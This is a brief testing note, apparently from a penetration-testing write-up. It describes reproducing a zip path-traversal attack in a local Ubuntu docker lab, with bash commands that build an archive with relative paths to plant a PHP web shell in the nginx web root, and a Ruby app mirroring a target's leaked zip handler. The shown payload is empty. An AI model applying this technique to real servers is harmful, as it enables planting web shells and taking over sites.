
## Testing
Used ubuntu docker, the likely victim machine. Created a sample zip file using relative file paths (../var/www/html) to attempt tp plant web shell in the nginx web root. Required additonal flags to unzip, `unzip :-` to make it respect relative paths. This would need to be tested in the ruby app.

Sample ruby app mirroring the zip handler seen in the leaked source code to build to test its handling of relative zip file paths (`temp.rb`). In testing, it was found to respect relative paths.

```bash
# setup env
docker run -it --rm -v $(pwd):/tmp ubuntu bash
apt update
apt install nginx ruby zip -y
/usr/sbin/nginx

# setup malicious zip file, payload is not important now
cd /tmp
touch /var/www/html/shell.php
zip images.zip .../var/www/html/shell.php

# install ruby reqts
gem install zip rubyzip

# run the test app
ruby temp.rb
```

